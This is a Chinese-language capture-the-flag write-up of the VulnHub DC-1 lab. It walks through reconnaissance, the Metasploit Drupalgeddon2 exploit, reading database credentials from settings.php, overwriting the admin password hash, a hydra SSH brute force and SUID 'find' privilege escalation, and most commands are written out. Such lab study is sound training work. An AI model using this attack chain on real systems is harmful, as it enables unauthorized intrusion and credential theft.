---
title: DC-1 LINUX SUID提权
date: 2021-08-19 00:02:10
updated: 2021-08-19 00:02:10
categories: 漏洞复现
password: npfs2333
---



LINUX SUID提权实战<!--more-->

# DC-1靶场介绍
在学习了上一篇章（LINUX SUID提权）的基础上，进行实战学习，并作如下记录

项目地址： https://www.vulnhub.com/entry/dc-1,292/

靶场介绍：Vulnhub是一个特别好的渗透测试实战网站，提供了许多带有漏洞的渗透测试
渗透要求：靶机需要获得root权限，并找到所有的5个flag
# 环境配置
因不知道DC-1靶机的IP，所有我们需要将靶机和kali放在同一个局域网里面，这里我选择桥接模式

![图片描述](https://static.cdnjs.cloud/20210808/image-1628388072613_816924564271.png)

注意下靶机和kali的网络适配器都要选桥接
![图片描述](https://static.cdnjs.cloud/20210808/image-1628388123481_640258364027.png)

这里建议连热点来做，不知道为什么连wifi的时候nmap扫不到IP地址


# 信息收集

## 1.目标IP收集
这里利用kali扫描域内存活主机—–arp-scan -l
![图片描述](https://static.cdnjs.cloud/20210807/image-1628336376039_456157178247.png)

## 2.目标端口收集
上述通过查询得到192.168.43.6 为靶机DC-1目标IP
这里利用nmap端口扫描—–nmap -sS 192.168.43.6

![图片描述](https://static.cdnjs.cloud/20210807/image-1628336433859_74812683397.png)

## 3.扫描目录
这里利用端口扫描工具御剑扫描到IP存在robots.txt目录

## 4.web页面信息收集
![图片描述](https://static.cdnjs.cloud/20210807/image-1628336552172_330133816216.png)

![图片描述](https://static.cdnjs.cloud/20210807/image-1628336732827_615880794987.png)

```
1.已知开源CMS-Drupal 版本：7
2.中间件服务器：apache 版本：2.2.22
3.php版本：5.4.45
4.数据库类型：mysql
```

# 攻击测试
1. 已知程序是开源drupalCMS，尝试使用cms漏洞攻击
这里利用kali-msf搜索cms模块—–search drupal

![图片描述](https://static.cdnjs.cloud/20210808/image-1628383479011_159489903672.png)

经过尝试发现攻击荷载—exploit/unix/webapp/drupal_drupalgeddon2可以使用
攻击荷载信息配置
```
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2 
msf5 exploit(unix/webapp/drupal_drupalgeddon2)>show options
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.43.6
run
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628383855991_204143614666.png)
攻击成功

# 漏洞利用
接下来是对5个flag获取的详细记录
# 获取flag1

使用ls查看目录，拿到flag1.txt
![图片描述](https://static.cdnjs.cloud/20210808/image-1628383900654_148997322421.png)

![图片描述](https://static.cdnjs.cloud/20210808/image-1628383949122_417458353130.png)
翻译flag提示
>每一个好的CMS都需要一个配置文件-你也一直需要

提示配置文件，想到网站cms的根配置文件，网上查询drupal配置文件位置

![图片描述](https://static.cdnjs.cloud/20210808/image-1628384067764_299537758954.png)

按照提示信息，去看看它的配置文件
首先进入交互式shell：python -c 'import pty; pty.spawn("/bin/bash")' 
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384124618_752063321233.png)

找到配置文件位置
```
find / -name settings.php
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384166855_320240989322.png)

# 获取flag2
使用cat /var/www/sites/default/settings.php命令打开，获取到flag2.txt 以及数据库为mysql账户密码
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384251471_522028805761.png)

翻译flag2提示
>蛮力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。你可以用这些凭据做什么？


# 获取flag3
根据flag2中提示，我们使用数据库信息去进入数据库中拿后台的账号密码。

首先登录数据库搜索相关信息
```
mysql -udbuser -pR0ck3t
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384494642_212725878396.png)

```
mysql>show databases;
mysql>use drupaldb;                # 使用drupaldb数据库
mysql>show tables;                 # 查看数据库内的表
查询到敏感表users
mysql>select * from users;
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384668505_557707204595.png)
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384699467_117381076330.png)
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384737618_848584948376.png)
![图片描述](https://static.cdnjs.cloud/20210808/image-1628384767921_516492003285.png)

查看账户表发现密码经过特殊hash加密

![图片描述](https://static.cdnjs.cloud/20210808/image-1628384830599_95010090433.png)

发现两个用户，但密码都是加密的且不好破解，所以我们选择使用一个我们已知的密文把它覆盖掉
查到的资料表示：在Drupal 7的安装目录中的scripts目录下，有一些Drupal 7开发者准备好的PHP脚本，可以执行一些高级操作。其中有一个脚本名为：password-hash.sh，它的功能是传入一个密码（字符串），即返回加密后的密码字符串。
```
php scripts/password-hash.sh admin1 > pwd.txt
cat pwd.txt
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628385561525_483183204675.png)
修改密码
```
update users set pass="$S$D2sypG2KL6EjTo08zxDCAx4D3lcAQx7Tk.hydYvH/hEDiNfo2AHS" where name="admin";
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628385716185_162869471136.png)

使用admin admin1 登录后台 在Content中拿到flag3
![图片描述](https://static.cdnjs.cloud/20210808/image-1628385795373_220727027696.png)

![图片描述](https://static.cdnjs.cloud/20210808/image-1628386238369_389998410000.png)

翻译flag3提示
>特殊的PERMS将帮助FIND密码——但你需要-exec该命令来找出如何获取shadow中的内容

提示我们需要特殊的fina权限去执行操作

# 获取flag4
返回终端`/etc/passwd`发现flag4
![图片描述](https://static.cdnjs.cloud/20210808/image-1628386474834_121893517518.png)

查看flag4提示
![图片描述](https://static.cdnjs.cloud/20210808/image-1628386546556_788730630513.png)
>您能否使用同一方法查找或访问根中的标记？
>可能。但也许没那么容易。 也许是吧？

我们使用同一方法去执行操作
首先利用九头蛇（hydra）破解flag4密码
```
hydra -l flag4 -P /usr/share/john/password.lst 192.168.40.141 ssh -vV -f -o hydra.ssh
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628386750118_80432704617.png)
得到密码为orange
ssh登录flag4账户
![图片描述](https://static.cdnjs.cloud/20210808/image-1628386899760_817248448318.png)

# 获取flag5（find提权）
## 信息收集
应该要查看shadow文件，并使用SUID命令提权。
![图片描述](https://static.cdnjs.cloud/20210808/image-1628387058520_345649857727.png)
使用以下命令可以发现系统上运行的所有SUID可执行文件。具体来说，命令将尝试查找具有root权限的SUID的文件。
```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

![图片描述](https://static.cdnjs.cloud/20210808/image-1628387119923_798852056477.png)

## 测试
```
利用find命令随便查找一个正确的文件（夹）路径，后面加上 -exec shell命令 \;：
```
![图片描述](https://static.cdnjs.cloud/20210808/image-1628387306359_691298869757.png)

发现find确实可以以root权限运行。

## 提权
提权 /bin/bash 或者 /bin/sh

![图片描述](https://static.cdnjs.cloud/20210808/image-1628387472600_867599966596.png)
成功提权，得到最后一个flag
![图片描述](https://static.cdnjs.cloud/20210808/image-1628387514519_672295275954.png)


也可以通过反弹shell的方式进行提权

![图片描述](https://static.cdnjs.cloud/20210808/image-1628387970346_192890936693.png)